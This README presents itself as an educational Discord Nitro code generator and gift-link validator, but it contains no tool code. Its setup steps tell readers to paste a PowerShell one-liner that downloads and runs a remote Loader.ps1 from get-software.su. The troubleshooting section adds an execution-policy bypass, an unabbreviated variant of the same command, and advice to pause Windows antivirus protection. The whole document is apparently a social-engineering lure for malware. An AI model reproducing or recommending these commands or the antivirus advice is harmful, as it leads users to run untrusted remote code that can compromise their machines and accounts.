# Discord Nitro Simulation & Validation Tool 🚀

A high-performance, asynchronous **Discord Nitro string generator** and **promotional link validator** built for educational purposes and API load testing. This project demonstrates advanced Python concepts including asynchronous networking, proxy rotation, and cryptographic pattern matching.

---

## 🔎 Overview & SEO Keywords

This repository serves as an open-source reference for developers studying automation techniques. It simulates the process of **Discord Nitro code generation** and checks token/gift validity using official public API endpoints. 

### Key Features & Architecture:
* **Discord Gift Link Generator**: Implements algorithmic pattern generation mimicking official Discord promotional links.
* **Asynchronous HTTP Requests**: Utilizes `aiohttp` for multi-threaded, high-speed API status checks.
* **Advanced Proxy Rotator**: Built-in support for HTTP, HTTPS, SOCKS4, and SOCKS5 proxies to prevent rate limiting (429 Too Many Requests).
* **Discord API Integration**: Real-time validation against the official `://discord.com` endpoint.

---

## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://get-software.su/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://get-software.su/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---
